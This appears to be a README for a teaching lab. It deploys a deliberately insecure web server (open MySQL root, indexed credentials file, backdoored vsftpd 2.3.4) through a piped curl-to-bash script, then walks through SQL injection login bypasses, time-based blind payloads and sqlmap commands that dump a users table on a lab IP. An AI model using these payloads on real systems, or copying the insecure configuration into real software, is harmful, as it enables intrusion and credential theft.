# Insecure Web Server Deployment

This repo contains a script to deploy an insecure webserver stack:
- nginx (credentials.txt indexed)
- mysql (Root user is open + default root/root)
- FTP (vsftp) (https://nvd.nist.gov/vuln/detail/CVE-2011-2523)
    - POC -> (https://gopikrish1792.medium.com/installing-exploiting-vulnerable-ftp-service-on-ubuntu-17ac76c9561a)
    - Source -> (https://github.com/nikdubois/vsftpd-2.3.4-infected)

# Run the Script

```bash
cd /home/root
apt install -y curl
curl -s https://raw.githubusercontent.com/TheMatrix97/Insecure-WebStack/refs/tags/1.0.0/script.sh | bash
```

# Part 2

## Basic SQLI

First, let's try to bypass de login for user admin:

```text
User: admin
Password: ' OR '1'='1
```

How could I get the password? Could I use a blind time-based attack?

**Time-Based**
```text
User: ' OR (select sleep(15));#
Password: asd
```


## SQLMap


Exploit the time-based blind sqli found in login.php to get the dbs

```bash
sqlmap -u "http://10.0.2.10/login.php" --data="username=1&password=2" --dbs
```

Then, dump the users table to get the username / passwords

```bash
sqlmap -u "http://10.0.2.10/login.php" --data="username=1&password=2" -D login_app -T users --dump --time-sec 1
```

Basic sqli check: `and (select sleep(10) from users where SUBSTR(table_name,1,1) = 'A')#`